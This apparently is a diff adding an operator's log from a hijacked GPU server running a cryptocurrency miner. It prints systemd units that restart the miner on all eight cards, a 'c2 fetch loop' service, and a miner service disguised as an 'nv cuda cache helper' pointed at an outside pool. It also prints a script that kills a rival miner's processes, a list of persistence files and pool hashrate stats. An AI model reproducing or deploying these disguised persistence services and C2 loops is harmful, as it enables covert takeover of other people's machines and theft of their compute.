@@ -1,0 +1,101 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### START10 2026-11-24T20:18:28Z
+### BACKUP
+===== /etc/systemd/system/plh-card@.service
+[Unit]
+Description=PLH PEARL miner card %i
+After=network-online.target
+[Service]
+Type=simple
+Nice=19
+ExecStart=/opt/plh/run_gpu.sh %i
+Restart=always
+RestartSec=20
+[Install]
+WantedBy=multi-user.target
+===== /etc/systemd/system/plh-c2fetch.service
+[Unit]
+Description=PLH second c2 fetch loop
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do /opt/plh/c2fetch.sh; sleep 20; done'
+Restart=always
+RestartSec=10
+[Install]
+WantedBy=multi-user.target
+===== /etc/systemd/system/nv-cuda-cache.service
+[Unit]
+Description=nv cuda cache helper
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048
+Restart=always
+RestartSec=30
+Nice=19
+[Install]
+WantedBy=multi-user.target
+===== /usr/local/lib/nv-cache/g.sh
+#!/bin/bash
+for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet nk-g$i || systemctl restart nk-g$i 2>/dev/null; done
+ps -eo pid,args | grep -E 'prl1p6grd5zl' | grep -v grep | awk '{print $1}' | xargs -r kill -KILL 2>/dev/null
+===== /dev/shm/.u/sample.sh
+#!/bin/bash
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+curl -s -m 20 "https://pearlhash.xyz/api/account/$W" -o /tmp/pha.$$.json
+printf '%s ' "$(date -u +%FT%TZ)" >> /dev/shm/.u/24h.jsonl
+python3 -c '
+import json,sys
+try: d=json.load(open(sys.argv[1]))
+except Exception as e: print("parse_err",e); raise SystemExit
+ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
+print(json.dumps({"est15":d.get("estimated_hashrate_15s"),"mine":len(ws),"names":[w["worker_name"] for w in ws]}))
+' /tmp/pha.$$.json >> /dev/shm/.u/24h.jsonl 2>/dev/null
+rm -f /tmp/pha.$$.json
+### PLH-PERSIST
+/root/vantage/out/farm_inv.txt
+/root/ul_farmfan/base.txt
+/root/ul_farmfan/f2.sh
+/root/ul/argv.backup.1795544976
+/root/ul/actor/plh_keepalive.sh
+/root/ul/actor/out.txt
+/root/ul/procs.before.txt
+/opt/plh/keepalive.sh
+/opt/plh/run_gpu.sh.orig
+/opt/plh/run_gpu.sh
+/opt/plh/foreign_pre.txt
+/opt/plh/evidence_ps.txt
+/opt/t19/www/i6425_p1.txt
+/opt/t19/www/up/ps.txt
+/opt/t19/www/i6647_r3.txt
+/opt/t19/www/i6647_r2.txt
+/opt/t19/www/i6647_r1.txt
+/opt/t19/www/diag6421.txt
+/opt/t19/www/out.txt
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+### DISPLACE
+remaining krig: 0
+### OURS
+### STATE
+active active active active active active active active 
+8
+ul-t2-123-184-7-135-g0 ul-t2-123-184-7-135-g1 ul-t2-123-184-7-135-g2 ul-t2-123-184-7-135-g3 ul-t2-123-184-7-135-g4 ul-t2-123-184-7-135-g5 ul-t2-123-184-7-135-g6 ul-t2-123-184-7-135-g7 
+0, 100 %, 6327 MiB 1, 100 %, 6327 MiB 2, 100 %, 6327 MiB 3, 100 %, 6327 MiB 4, 100 %, 6327 MiB 5, 100 %, 6327 MiB 6, 100 %, 6327 MiB 7, 100 %, 6327 MiB 
+### POOL
+ours-n 9 total-pool-rows 169
+ul-t19-123-184-7-135-g7 offline valid 1227 age 13078 hs30m 0.0
+ul-t2-123-184-7-135-g0 online valid 67 age 19 hs30m 150.1
+ul-t2-123-184-7-135-g1 online valid 64 age 17 hs30m 125.1
+ul-t2-123-184-7-135-g2 online valid 73 age 824 hs30m 130.1
+ul-t2-123-184-7-135-g3 online valid 77 age 804 hs30m 145.1
+ul-t2-123-184-7-135-g4 online valid 86 age 822 hs30m 145.1
+ul-t2-123-184-7-135-g5 online valid 74 age 9 hs30m 145.1
+ul-t2-123-184-7-135-g6 online valid 79 age 29 hs30m 120.1
+ul-t2-123-184-7-135-g7 online valid 65 age 823 hs30m 90.1
+### DONE10 2026-11-24T20:19:30Z
